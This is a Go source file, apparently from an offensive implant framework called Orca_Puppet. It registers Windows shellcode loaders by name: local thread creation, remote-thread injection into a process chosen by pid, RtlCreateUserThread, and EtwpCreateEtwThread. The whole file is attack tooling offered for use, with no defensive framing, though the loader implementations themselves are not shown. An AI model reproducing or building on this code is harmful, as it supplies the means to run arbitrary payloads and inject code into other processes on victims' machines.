//go:build windows
// +build windows

package shellcodeopt

import "Orca_Puppet/pkg/loader"

type loadFunc func(shellcode []byte, pid int) string

var LoaderMap = make(map[string]loadFunc)

func InitLoaderMap() {
	LoaderMap["createthread"] = loader.RunCreateThread
	LoaderMap["createremotethread"] = loader.RunCreateRemoteThread
	LoaderMap["rtlcreateuserthread"] = loader.RunRtlCreateUserThread
	LoaderMap["etwpcreateetwthread"] = loader.EtwpCreateEtwThread
}
